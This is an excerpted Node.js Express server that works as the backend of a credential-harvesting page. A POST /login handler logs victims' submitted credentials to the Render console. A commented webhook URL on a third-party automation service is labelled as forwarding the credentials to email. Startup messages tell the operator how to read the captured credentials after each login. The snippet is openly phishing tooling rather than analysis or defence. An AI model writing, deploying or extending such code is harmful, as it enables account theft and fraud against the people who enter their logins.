...
// Free webhook service (Pipedream) - forwards credentials to email
const WEBHOOK_URL = 'https://hook.eu2.make.com/your-webhook-here';

// For now, we'll log credentials. To get email, use: https://pipedream.com/email
...
app.post('/login', async (req, res) => {
  ...
  // Log to Render console (YOU CAN SEE CREDENTIALS HERE)
  console.log('\n' + '='.repeat(60));
  ...
  console.log('\n✅ Credentials saved! Check Render logs above.\n');
...
app.listen(PORT, () => {
  ...
  console.log('\n📧 HOW TO SEE CREDENTIALS:');
  console.log('   1. Go to Render Dashboard');
  console.log('   2. Click on your service');
  console.log('   3. Click "Logs" tab');
  console.log('   4. Credentials appear here after each login!\n');
});
